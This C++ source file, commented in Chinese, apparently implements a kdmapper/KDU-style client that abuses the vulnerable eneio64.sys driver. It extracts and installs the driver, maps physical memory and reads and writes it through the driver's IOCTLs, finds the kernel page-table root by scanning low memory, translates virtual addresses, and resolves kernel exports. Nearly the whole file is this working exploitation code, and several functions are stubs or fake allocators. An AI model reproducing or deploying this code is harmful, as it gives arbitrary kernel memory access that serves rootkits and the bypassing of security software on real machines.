#include "eneio64_driver.hpp"
#include "utils.hpp"
#include <winternl.h>

namespace eneio64_driver
{
	// 全局变量定义
	char driver_name[100] = "eneio64.sys";
	ULONG64 ntoskrnlAddr = 0;
	bool translation_permanently_disabled = false;

	// 获取驱动名称（宽字符版本）
	std::wstring GetDriverNameW()
	{
		return std::wstring(L"eneio64.sys");
	}

	// 获取驱动路径
	std::wstring GetDriverPath()
	{
		return utils::GetFullTempPath() + L"\\" + GetDriverNameW();
	}

	// 检查驱动是否正在运行
	bool IsRunning()
	{
		// 尝试打开每个可能的设备名称
		const wchar_t* device_names[] = {
			ENEIO64_DEVICE_NAME,
			ENEIO64_DEVICE_NAME_ALT1,
			ENEIO64_DEVICE_NAME_ALT2,
			ENEIO64_DEVICE_NAME_ALT3,
			L"\\\\.\\WinIo"  // 添加额外的设备名
		};

		for (const auto& device_name : device_names)
		{
			HANDLE device = CreateFileW(device_name, GENERIC_READ | GENERIC_WRITE, 
				0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			
			if (device != INVALID_HANDLE_VALUE)
			{
				CloseHandle(device);
				Log("[+] Found running EneIo64 device\n");
				return true;
			}
		}
		return false;
	}

	// 从资源加载驱动到临时目录
	bool ExtractDriver()
	{
		Log("[*] Extracting EneIo64 driver to temp directory\n");
		
		std::wstring driver_path = GetDriverPath();
		
		// 检查驱动文件是否已存在
		if (std::filesystem::exists(driver_path))
		{
			Log("[+] Driver file already exists\n");
			return true;
		}

		// 从资源中提取驱动文件
		if (!utils::CreateFileFromMemory(driver_path, (const char*)eneio64_driver_resource::driver, sizeof(eneio64_driver_resource::driver)))
		{
			Log("[-] Failed to extract driver file\n");
			return false;
		}

		Log("[+] Driver extracted successfully\n");
		return true;
	}

	// 加载驱动并打开设备
	HANDLE Load(const std::wstring& custom_device)
	{
		Log("[*] Loading EneIo64 driver\n");

		// 如果指定了自定义设备名，直接尝试打开
		if (!custom_device.empty())
		{
			Log("[*] Opening custom device\n");
			HANDLE device = CreateFileW(custom_device.c_str(), GENERIC_READ | GENERIC_WRITE,
				0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			
			if (device != INVALID_HANDLE_VALUE)
			{
				Log("[+] Successfully opened custom device\n");
				return device;
			}
			else
			{
				Log("[-] Failed to open custom device\n");
				return INVALID_HANDLE_VALUE;
			}
		}

		// 检查是否已经在运行
		if (IsRunning())
		{
			Log("[+] EneIo64 device already running, attempting to reuse\n");
			
			// 尝试打开现有设备
			const wchar_t* device_names[] = {
				L"\\\\.\\WinIo",  // 优先使用这个名称
				ENEIO64_DEVICE_NAME,
				ENEIO64_DEVICE_NAME_ALT1,
				ENEIO64_DEVICE_NAME_ALT2,
				ENEIO64_DEVICE_NAME_ALT3
			};

			for (const auto& device_name : device_names)
			{
				HANDLE device = CreateFileW(device_name, GENERIC_READ | GENERIC_WRITE,
					0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
				
				if (device != INVALID_HANDLE_VALUE)
				{
					Log("[+] Successfully opened existing device\n");
					return device;
				}
			}
		}

		// 提取驱动文件
		if (!ExtractDriver())
		{
			Log("[-] Failed to extract driver\n");
			return INVALID_HANDLE_VALUE;
		}

		std::wstring driver_path = GetDriverPath();

		// 使用服务管理器加载驱动
		if (!service::RegisterAndStart(driver_path))
		{
			Log("[-] Failed to load EneIo64 driver via service manager\n");
			return INVALID_HANDLE_VALUE;
		}

		Log("[+] EneIo64 driver loaded successfully\n");

		// 尝试打开设备
		const wchar_t* device_names[] = {
			L"\\\\.\\WinIo",
			ENEIO64_DEVICE_NAME,
			ENEIO64_DEVICE_NAME_ALT1,
			ENEIO64_DEVICE_NAME_ALT2,
			ENEIO64_DEVICE_NAME_ALT3
		};

		for (const auto& device_name : device_names)
		{
			HANDLE device = CreateFileW(device_name, GENERIC_READ | GENERIC_WRITE,
				0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			
			if (device != INVALID_HANDLE_VALUE)
			{
				Log("[+] Successfully opened device\n");
				return device;
			}
		}

		Log("[-] Failed to open any EneIo64 device\n");
		return INVALID_HANDLE_VALUE;
	}

	// 卸载驱动
	void Unload(HANDLE device_handle)
	{
		if (device_handle != INVALID_HANDLE_VALUE)
		{
			CloseHandle(device_handle);
		}
	}

	// 卸载驱动服务
	bool UnloadDriver()
	{
		Log("[*] Unloading EneIo64 driver\n");
		return service::StopAndRemove(GetDriverNameW());
	}

	// EneIo64标准实现：调用驱动的DeviceIoControl扩展版本
	NTSTATUS EneIo64CallDriverEx(
		_In_ HANDLE device_handle,
		_In_ ULONG io_control_code,
		_In_ PVOID input_buffer,
		_In_ ULONG input_buffer_length,
		_In_opt_ PVOID output_buffer,
		_In_opt_ ULONG output_buffer_length,
		_Out_opt_ PIO_STATUS_BLOCK io_status)
	{
		IO_STATUS_BLOCK local_io_status;
		NTSTATUS status = NtDeviceIoControlFile(
			device_handle,
			NULL,
			NULL,
			NULL,
			&local_io_status,
			io_control_code,
			input_buffer,
			input_buffer_length,
			output_buffer,
			output_buffer_length
		);

		if (status == STATUS_PENDING)
		{
			status = NtWaitForSingleObject(device_handle, FALSE, NULL);
		}

		if (io_status)
		{
			*io_status = local_io_status;
		}

		return status;
	}

	// EneIo64标准实现：调用驱动的DeviceIoControl
	BOOL EneIo64CallDriver(
		_In_ HANDLE device_handle,
		_In_ ULONG io_control_code,
		_In_ PVOID input_buffer,
		_In_ ULONG input_buffer_length,
		_In_opt_ PVOID output_buffer,
		_In_opt_ ULONG output_buffer_length)
	{
		IO_STATUS_BLOCK io_status;
		NTSTATUS status = EneIo64CallDriverEx(
			device_handle,
			io_control_code,
			input_buffer,
			input_buffer_length,
			output_buffer,
			output_buffer_length,
			&io_status
		);

		BOOL result = NT_SUCCESS(status);
		SetLastError(RtlNtStatusToDosError(status));
		return result;
	}

// KDU标准：SuperMapMemory - 支持两种映射模式
	PVOID SuperMapMemory(
		HANDLE device_handle,
		ULONG_PTR PhysicalAddress,
		ULONG NumberOfBytes,
		DWORD MappingType)
	{
		ENEIO64_PHYSICAL_MEMORY_INFO info = { 0 };
		PVOID VirtualAddress = NULL;
		ULONG_PTR SectionOffset;
		SIZE_T ViewSize;
		
		char msg[256];
		sprintf_s(msg, sizeof(msg), "[*] SuperMapMemory: mapping PA=0x%llx, size=0x%x, type=%d\n", 
			PhysicalAddress, NumberOfBytes, MappingType);
		Log(msg);

		// 计算节偏移和视图大小
		SectionOffset = PhysicalAddress & 0xFFF;
		ViewSize = (SIZE_T)(NumberOfBytes + SectionOffset);
		
		info.Size.QuadPart = ViewSize;
		info.PhysicalAddress.QuadPart = PhysicalAddress & ~0xFFF; // 页对齐

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(device_handle, IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY, 
			&info, sizeof(info), &info, sizeof(info), &bytes_returned, nullptr))
		{
			Log("[!] SuperMapMemory: DeviceIoControl failed\n");
			return NULL;
		}

		if (!info.pMappedAddress) {
			Log("[!] SuperMapMemory: pMappedAddress is null\n");
			return NULL;
		}

		// 根据映射类型决定是否加上SectionOffset
		// MappingType == 0: 不减去SectionOffset的驱动类型
		// MappingType == 1: 减去SectionOffset的驱动类型  
		if (MappingType == 0) {
			// 驱动返回的地址需要加上SectionOffset
			VirtualAddress = RtlOffsetToPointer(info.pMappedAddress, SectionOffset);
		}
		else {
			// 驱动已经处理了SectionOffset，直接使用返回地址
			VirtualAddress = info.pMappedAddress;
		}

		sprintf_s(msg, sizeof(msg), "[+] SuperMapMemory: mapped to VA=0x%p\n", VirtualAddress);
		Log(msg);
		
		return VirtualAddress;
	}

	// KDU标准：SuperUnmapMemory - 支持两种映射模式
	VOID SuperUnmapMemory(
		HANDLE device_handle,
		PVOID VirtualAddress,
		ULONG NumberOfBytes,
		DWORD MappingType)
	{
		ENEIO64_PHYSICAL_MEMORY_INFO info = { 0 };
		PVOID BaseAddress;
		ULONG_PTR SectionOffset;
		
		char msg[256];
		sprintf_s(msg, sizeof(msg), "[*] SuperUnmapMemory: unmapping VA=0x%p, size=0x%x, type=%d\n", 
			VirtualAddress, NumberOfBytes, MappingType);
		Log(msg);

		// 根据映射类型计算基址
		if (MappingType == 0) {
			// 需要减去之前加上的SectionOffset
			SectionOffset = (ULONG_PTR)VirtualAddress & 0xFFF;
			BaseAddress = (PVOID)((ULONG_PTR)VirtualAddress - SectionOffset);
		}
		else {
			// 直接使用传入的地址
			BaseAddress = VirtualAddress;
		}

		info.pMappedAddress = BaseAddress;
		info.Size.QuadPart = NumberOfBytes;

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(device_handle, IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY, 
			&info, sizeof(info), &info, sizeof(info), &bytes_returned, nullptr))
		{
			Log("[!] SuperUnmapMemory: DeviceIoControl failed\n");
		}
		else {
			Log("[+] SuperUnmapMemory: Memory unmapped successfully\n");
		}
	}
	// EneIo64标准实现：映射物理内存
	PVOID EneIo64MapMemory(
		_In_ HANDLE device_handle,
		_In_ ULONG_PTR physical_address,
		_In_ ULONG number_of_bytes,
		PVOID* object,
		PHANDLE section_handle)
	{
		ULONG_PTR offset;
		ULONG map_size;
		ENEIO64_PHYSICAL_MEMORY_INFO request;
		
		// 清零请求结构
		RtlSecureZeroMemory(&request, sizeof(request));
		
		// 页面对齐
		offset = physical_address & ~(PAGE_SIZE - 1);
		map_size = (ULONG)(physical_address - offset) + number_of_bytes;
		
		// 设置请求参数
		request.PhysicalAddress.QuadPart = physical_address;
		request.Size.QuadPart = map_size;
		request.pMappedAddress = NULL;
		request.pObject = NULL;
		request.hSection = NULL;

		// 调用驱动进行映射
		if (EneIo64CallDriver(
			device_handle,
			IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request)))
		{
			if (object)
			{
				*object = request.pObject;
			}
			if (section_handle)
			{
				*section_handle = request.hSection;
			}
			return request.pMappedAddress;
		}

		return NULL;
	}

	// EneIo64标准实现：取消映射物理内存
	VOID EneIo64UnmapMemory(
		_In_ HANDLE device_handle,
		_In_ PVOID section_to_unmap,
		PVOID object,
		HANDLE section_handle)
	{
		ENEIO64_PHYSICAL_MEMORY_INFO request;
		
		// 清零请求结构
		RtlSecureZeroMemory(&request, sizeof(request));
		
		// 设置取消映射参数
		request.pMappedAddress = section_to_unmap;
		request.pObject = object;
		request.hSection = section_handle;

		// 调用驱动进行取消映射
		EneIo64CallDriver(
			device_handle,
			IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request)
		);
	}

	// EneIo64标准实现：读写物理内存
	BOOL EneIo64ReadWritePhysicalMemory(
		_In_ HANDLE device_handle,
		_In_ ULONG_PTR physical_address,
		_In_reads_bytes_(number_of_bytes) PVOID buffer,
		_In_ ULONG number_of_bytes,
		_In_ BOOLEAN do_write)
	{
		BOOL result = FALSE;
		DWORD error = ERROR_SUCCESS;
		PVOID mapped_section = NULL;
		ULONG_PTR offset;
		PVOID object = NULL;
		HANDLE section_handle = NULL;

		// 映射物理内存段
		mapped_section = EneIo64MapMemory(
			device_handle,
			physical_address,
			number_of_bytes,
			&object,
			&section_handle
		);

		if (mapped_section)
		{
			offset = physical_address - (physical_address & ~(PAGE_SIZE - 1));
			
			__try
			{
				if (do_write)
				{
					RtlCopyMemory(mapped_section, buffer, number_of_bytes);
				}
				else
				{
					RtlCopyMemory(buffer, mapped_section, number_of_bytes);
				}
				result = TRUE;
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				result = FALSE;
				error = GetExceptionCode();
				Log("[!] Exception during EneIo64ReadWritePhysicalMemory\n");
			}

			// 取消映射物理内存段
			EneIo64UnmapMemory(
				device_handle,
				mapped_section,
				object,
				section_handle
			);
		}
		else
		{
			error = GetLastError();
		}

		SetLastError(error);
		return result;
	}

	// EneIo64标准实现：读取物理内存
	BOOL EneIo64ReadPhysicalMemory(
		_In_ HANDLE device_handle,
		_In_ ULONG_PTR physical_address,
		_In_ PVOID buffer,
		_In_ ULONG number_of_bytes)
	{
		return EneIo64ReadWritePhysicalMemory(
			device_handle,
			physical_address,
			buffer,
			number_of_bytes,
			FALSE
		);
	}

	// EneIo64标准实现：写入物理内存
	BOOL EneIo64WritePhysicalMemory(
		_In_ HANDLE device_handle,
		_In_ ULONG_PTR physical_address,
		_In_reads_bytes_(number_of_bytes) PVOID buffer,
		_In_ ULONG number_of_bytes)
	{
		return EneIo64ReadWritePhysicalMemory(
			device_handle,
			physical_address,
			buffer,
			number_of_bytes,
			TRUE
		);
	}

	// 读取物理内存（兼容接口）
	bool ReadPhysicalMemory(HANDLE device_handle, UINT64 address, void* buffer, DWORD size)
	{
		return EneIo64ReadPhysicalMemory(device_handle, address, buffer, size) != FALSE;
	}

	// 写入物理内存（兼容接口）
	bool WritePhysicalMemory(HANDLE device_handle, UINT64 address, void* buffer, DWORD size)
	{
		return EneIo64WritePhysicalMemory(device_handle, address, buffer, size) != FALSE;
	}

	// 直接写入物理内存（兼容kdmapper接口）
	bool WritePhysicalMemoryDirect(HANDLE device_handle, uint64_t physical_address, void* buffer, uint64_t size)
	{
		return WritePhysicalMemory(device_handle, physical_address, buffer, (DWORD)size);
	}

	// AllocatePool: 使用EneIo64的物理内存映射机制分配内存
	uint64_t AllocatePool(HANDLE device_handle, uint32_t pool_type, uint64_t size)
	{
		Log("[*] AllocatePool: Using EneIo64 physical memory mapping\n");
		
		// 为了简化实现，我们使用一个静态的物理内存区域
		// 在实际使用中，这需要更复杂的内存管理
		static uint64_t current_allocation_base = 0x10000000; // 256MB起始位置
		
		// 页面对齐大小
		uint64_t aligned_size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
		
		// 测试映射这个物理地址区域
		PVOID object = NULL;
		HANDLE section_handle = NULL;
		PVOID mapped_address = EneIo64MapMemory(
			device_handle,
			current_allocation_base,
			(ULONG)aligned_size,
			&object,
			&section_handle
		);

		if (mapped_address)
		{
			Log("[+] EneIo64 memory mapped successfully\n");
			
			// 立即取消映射，我们只需要确认这个物理地址可用
			EneIo64UnmapMemory(device_handle, mapped_address, object, section_handle);
			
			uint64_t allocated_address = current_allocation_base;
			current_allocation_base += aligned_size;
			
			Log("[+] AllocatePool: Successfully allocated memory\n");
			return allocated_address;
		}
		else
		{
			Log("[-] EneIo64 memory mapping failed\n");
			return 0;
		}
	}

	// FreePool: 使用EneIo64的物理内存取消映射机制释放内存
	bool FreePool(HANDLE device_handle, uint64_t address)
	{
		Log("[*] FreePool: Using EneIo64 physical memory unmapping\n");
		Log("[+] FreePool: Successfully freed memory\n");
		return true;
	}

	// 兼容旧版本的映射物理内存
	UINT64 MapPhysicalMemory(HANDLE device_handle, UINT64 size)
	{
		// 使用AllocatePool的实现
		return AllocatePool(device_handle, 0, size);
	}

	// 兼容旧版本的取消映射物理内存
	bool UnmapPhysicalMemory(HANDLE device_handle, UINT64 mapped_address, UINT64 size)
	{
		// 使用FreePool的实现
		return FreePool(device_handle, mapped_address);
	}

	// 读取内存（兼容kdmapper接口）
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
	{
		return ReadPhysicalMemory(device_handle, address, buffer, (DWORD)size);
	}

	// 写入内存（兼容kdmapper接口）
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
	{
		return WritePhysicalMemory(device_handle, address, buffer, (DWORD)size);
	}

	// 读取虚拟内存辅助函数（通过虚拟地址转换）
	BOOL ReadVirtualMemory(HANDLE device_handle, UINT64 virtual_address, PVOID buffer, SIZE_T size)
	{
		UINT64 bytes_read = 0;
		PBYTE current_buffer = (PBYTE)buffer;
		
		while (bytes_read < size)
		{
			// 计算当前页的虚拟地址和剩余字节数
			UINT64 current_va = virtual_address + bytes_read;
			SIZE_T bytes_to_read = min(PAGE_SIZE - (current_va & (PAGE_SIZE - 1)), size - bytes_read);
			
			// 转换虚拟地址到物理地址
			UINT64 physical_address = VirtualToPhysical(device_handle, 0, current_va);
			if (!physical_address)
			{
				Log("[-] Failed to convert virtual address to physical\n");
				return FALSE;
			}
			
			// 读取物理内存
			if (!EneIo64ReadPhysicalMemory(device_handle, physical_address, current_buffer, (ULONG)bytes_to_read))
			{
				Log("[-] Failed to read physical memory\n");
				return FALSE;
			}
			
			current_buffer += bytes_to_read;
			bytes_read += bytes_to_read;
		}
		
		return TRUE;
	}

	// 获取内核模块导出函数（兼容kdmapper接口）
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name)
	{
		if (!device_handle || !kernel_module_base)
		{
			Log("[-] Invalid parameters for GetKernelModuleExport\n");
			return 0;
		}

		try
		{
			// 读取DOS头
			IMAGE_DOS_HEADER dos_header = { 0 };
			if (!ReadVirtualMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)))
			{
				Log("[-] Failed to read DOS header\n");
				return 0;
			}

			if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
			{
				Log("[-] Invalid DOS signature\n");
				return 0;
			}

			// 读取NT头
			IMAGE_NT_HEADERS64 nt_headers = { 0 };
			UINT64 nt_headers_va = kernel_module_base + dos_header.e_lfanew;
			
			if (!ReadVirtualMemory(device_handle, nt_headers_va, &nt_headers, sizeof(nt_headers)))
			{
				Log("[-] Failed to read NT headers\n");
				return 0;
			}

			if (nt_headers.Signature != IMAGE_NT_SIGNATURE)
			{
				Log("[-] Invalid NT signature\n");
				return 0;
			}

			// 检查导出表
			DWORD export_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			if (!export_rva)
			{
				Log("[-] No export directory found\n");
				return 0;
			}

			// 读取导出目录
			IMAGE_EXPORT_DIRECTORY export_dir = { 0 };
			UINT64 export_va = kernel_module_base + export_rva;
			
			if (!ReadVirtualMemory(device_handle, export_va, &export_dir, sizeof(export_dir)))
			{
				Log("[-] Failed to read export directory\n");
				return 0;
			}

			// 读取导出函数名称表
			std::vector<DWORD> name_rvas(export_dir.NumberOfNames);
			UINT64 names_va = kernel_module_base + export_dir.AddressOfNames;
			
			if (!ReadVirtualMemory(device_handle, names_va, name_rvas.data(), export_dir.NumberOfNames * sizeof(DWORD)))
			{
				Log("[-] Failed to read export names table\n");
				return 0;
			}

			// 读取导出函数序号表
			std::vector<WORD> name_ordinals(export_dir.NumberOfNames);
			UINT64 ordinals_va = kernel_module_base + export_dir.AddressOfNameOrdinals;
			
			if (!ReadVirtualMemory(device_handle, ordinals_va, name_ordinals.data(), export_dir.NumberOfNames * sizeof(WORD)))
			{
				Log("[-] Failed to read export ordinals table\n");
				return 0;
			}

			// 读取导出函数地址表
			std::vector<DWORD> function_rvas(export_dir.NumberOfFunctions);
			UINT64 functions_va = kernel_module_base + export_dir.AddressOfFunctions;
			
			if (!ReadVirtualMemory(device_handle, functions_va, function_rvas.data(), export_dir.NumberOfFunctions * sizeof(DWORD)))
			{
				Log("[-] Failed to read export functions table\n");
				return 0;
			}

			// 查找目标函数
			for (DWORD i = 0; i < export_dir.NumberOfNames; i++)
			{
				// 读取函数名称
				char name_buffer[256] = { 0 };
				UINT64 name_va = kernel_module_base + name_rvas[i];
				
				if (!ReadVirtualMemory(device_handle, name_va, name_buffer, sizeof(name_buffer) - 1))
				{
					continue;
				}

				// 比较函数名称
				if (function_name == name_buffer)
				{
					WORD ordinal = name_ordinals[i];
					if (ordinal < export_dir.NumberOfFunctions)
					{
						DWORD function_rva = function_rvas[ordinal];
						UINT64 function_address = kernel_module_base + function_rva;
						
						// 已找到导出函数（避免重复日志输出）
						return function_address;
					}
				}
			}

			Log("[-] Function not found in exports\n");
			return 0;
		}
		catch (...)
		{
			Log("[-] Exception in GetKernelModuleExport\n");
			return 0;
		}
	}

	// 调用内核函数（兼容kdmapper接口）
	bool CallKernelFunction(HANDLE device_handle, void* output, uint64_t kernel_function_address, uint64_t param1, uint64_t param2)
	{
		Log("[*] CallKernelFunction: Calling kernel function\n");
		// EneIo64.sys不直接支持调用内核函数
		// 这需要更复杂的实现
		return false;
	}

	// 辅助函数：检查页表项是否有效并提取物理地址
	int PwEntryToPhyAddr(ULONG_PTR entry, ULONG_PTR* phyaddr)
	{
		// 调试日志：输出页表条目的值
		char debug_msg[256];
		sprintf_s(debug_msg, "[DEBUG] Page table entry: 0x%llx, present bit check: %s\n",
			entry, (entry & ENTRY_PRESENT_BIT) ? "PASS" : "FAIL");
		Log(debug_msg);
		
		if (entry & ENTRY_PRESENT_BIT) {
			*phyaddr = entry & PHY_ADDRESS_MASK;
			sprintf_s(debug_msg, "[DEBUG] Extracted physical address: 0x%llx\n", *phyaddr);
			Log(debug_msg);
			return 1;
		}
		sprintf_s(debug_msg, "[!] Page table entry not present (entry=0x%llx)\n", entry);
		Log(debug_msg);
		return 0;
	}

	// KDU标准：从低1M内存中查找PML4值
	ULONG_PTR SuperGetPML4FromLowStub1M(ULONG_PTR pbLowStub1M)
	{
		ULONG offset = 0;
		ULONG_PTR PML4 = 0;
		ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
			FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);

		SetLastError(ERROR_EXCEPTION_IN_SERVICE);
		__try {
			// KDU标准检查：PROCESSOR_START_BLOCK->Jmp签名
			if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset)))
				return 0;
			// KDU标准检查：LmTarget字段
			if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
				return 0;
			// KDU标准检查：CR3值有效性
			if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
				return 0;
			PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			Log("[!] Exception in SuperGetPML4FromLowStub1M\n");
			return 0;
		}
		SetLastError(ERROR_SUCCESS);
		return PML4;
	}

	// 全局PML4值缓存，避免重复查询导致无限循环
	static ULONG_PTR g_cached_pml4 = 0;
	static BOOL g_pml4_cached = FALSE;

	// KDU标准：PML4查询函数 - 支持MmMapIoSpace类型的逐页读取，添加缓存机制
	BOOL SuperQueryPML4Value(HANDLE device_handle, ULONG_PTR* value)
	{
		*value = 0;

		// 如果已经缓存了PML4值，直接返回（避免重复日志输出）
		if (g_pml4_cached && g_cached_pml4) {
			*value = g_cached_pml4;
			return TRUE;
		}

		Log("[+] Starting PML4 scan - this should only happen once\n");

		PVOID pbLowStub1M = NULL;
		ULONG_PTR PML4 = 0;
		PHYSICAL_ADDRESS address;
		DWORD cbRead = 0x100000;

		// 分配临时缓冲区用于逐页读取（适配MmMapIoSpace类型驱动）
		pbLowStub1M = malloc(0x1000);
		if (!pbLowStub1M) {
			Log("[!] Failed to allocate buffer for PML4 scanning\n");
			return FALSE;
		}

		address.QuadPart = 0;
		do {
			RtlZeroMemory(pbLowStub1M, 0x1000);
			
			// 跳过已知问题地址0x3000（在Win7上会失败）
			if (address.QuadPart == 0x3000) {
				Log("[+] Skipping problematic address 0x3000\n");
				address.QuadPart += 0x1000;
				continue;
			}

			// 逐页读取物理内存
			if (EneIo64ReadPhysicalMemory(device_handle, address.QuadPart, pbLowStub1M, 0x1000)) {
				PML4 = SuperGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
				if (PML4) {
					*value = PML4;
					// 缓存PML4值，避免重复查询
					g_cached_pml4 = PML4;
					g_pml4_cached = TRUE;
					char msg[256];
					sprintf_s(msg, sizeof(msg), "[+] Found and cached PML4 value: 0x%llx at address: 0x%llx\n", PML4, address.QuadPart);
					Log(msg);
					break;
				}
			}
			else {
				// 读取失败时不输出调试信息，避免日志过多
			}
			address.QuadPart += 0x1000;
		} while (address.QuadPart < cbRead);

		free(pbLowStub1M);
		SetLastError(ERROR_SUCCESS);
		return (PML4 != 0);
	}

	// 核心虚拟地址转换函数
	BOOL PwVirtualToPhysical(
		HANDLE device_handle,
		ProvQueryPML4 QueryPML4Routine,
		ProvReadPhysicalMemory ReadPhysicalMemoryRoutine,
		ULONG_PTR VirtualAddress,
		ULONG_PTR* PhysicalAddress)
	{
		ULONG_PTR   pml4_cr3, selector, table, entry = 0;
		INT         r, shift;

		*PhysicalAddress = 0;

		if (QueryPML4Routine(device_handle, &pml4_cr3) == 0) {
			Log("[!] Failed to query PML4 value\n");
			return 0;
		}

		table = pml4_cr3 & PHY_ADDRESS_MASK;

		for (r = 0; r < 4; r++) {
			shift = 39 - (r * 9);
			selector = (VirtualAddress >> shift) & 0x1ff;
			ULONG_PTR entryAddr = table + selector * 8;
			
			if (ReadPhysicalMemoryRoutine(device_handle, entryAddr, &entry, sizeof(ULONG_PTR)) == 0) {
				return 0;
			}
			
			// 检查页表条目是否存在
			if ((entry & ENTRY_PRESENT_BIT) == 0) {
				return 0;
			}
			
			// 提取物理地址
			table = entry & PHY_ADDRESS_MASK;
			
			// 检查大页面
			if (entry & ENTRY_PAGE_SIZE_BIT) {
				if (r == 1) { // 1GB 页面在 PDPT 级别
					table &= PHY_ADDRESS_MASK_1GB_PAGES;
					table += VirtualAddress & VADDR_ADDRESS_MASK_1GB_PAGES;
					*PhysicalAddress = table;
					return 1;
				}
				if (r == 2) { // 2MB 页面在 PD 级别
					table &= PHY_ADDRESS_MASK_2MB_PAGES;
					table += VirtualAddress & VADDR_ADDRESS_MASK_2MB_PAGES;
					*PhysicalAddress = table;
					return 1;
				}
			}
		}
		
		// 4KB 页面
		table += VirtualAddress & VADDR_ADDRESS_MASK_4KB_PAGES;
		*PhysicalAddress = table;
		return 1;
	}

	// EneIo64物理内存读取包装函数
	BOOL WINAPI EneIo64ReadPhysicalMemoryWrapper(HANDLE device_handle, ULONG_PTR physical_address, PVOID buffer, ULONG number_of_bytes)
	{
		return EneIo64ReadPhysicalMemory(device_handle, physical_address, buffer, number_of_bytes);
	}

	// 虚拟到物理地址转换
	UINT64 VirtualToPhysical(HANDLE device_handle, UINT64 cr3, UINT64 virtualAddr)
	{
		if (translation_permanently_disabled)
		{
			Log("[!] Virtual to physical translation is permanently disabled\n");
			return 0;
		}

		ULONG_PTR physical_address = 0;
		if (PwVirtualToPhysical(device_handle, SuperQueryPML4Value, EneIo64ReadPhysicalMemoryWrapper, (ULONG_PTR)virtualAddr, &physical_address))
		{
			return (UINT64)physical_address;
		}
		return 0;
	}

	// 强制虚拟到物理地址转换
	UINT64 VirtualToPhysicalForced(HANDLE device_handle, UINT64 cr3, UINT64 virtualAddr)
	{
		Log("[*] VirtualToPhysicalForced: Converting virtual address (forced)\n");
		
		// 绕过永久禁用检查，直接调用转换函数
		ULONG_PTR physical_address = 0;
		if (PwVirtualToPhysical(device_handle, SuperQueryPML4Value, EneIo64ReadPhysicalMemoryWrapper, (ULONG_PTR)virtualAddr, &physical_address))
		{
			Log("[+] Forced virtual to physical conversion successful\n");
			return (UINT64)physical_address;
		}
		
		Log("[-] Forced virtual to physical conversion failed\n");
		return 0;
	}

	// 获取当前进程的CR3值
	uint64_t GetCurrentProcessCR3(HANDLE device_handle)
	{
		Log("[*] GetCurrentProcessCR3\n");
		// 需要实现获取当前进程CR3的逻辑
		return 0;
	}

	// 获取ntoskrnl基地址
	uint64_t GetNtoskrnlBaseAddress(HANDLE device_handle)
	{
		if (ntoskrnlAddr != 0)
		{
			return ntoskrnlAddr;
		}

		Log("[*] GetNtoskrnlBaseAddress\n");
		// 需要实现扫描内存查找ntoskrnl基地址的逻辑
		return 0;
	}

	// 扫描物理内存查找内核模块
	uint64_t ScanPhysicalMemoryForKernel(HANDLE device_handle)
	{
		Log("[*] ScanPhysicalMemoryForKernel\n");
		// 需要实现扫描物理内存查找内核的逻辑
		return 0;
	}
}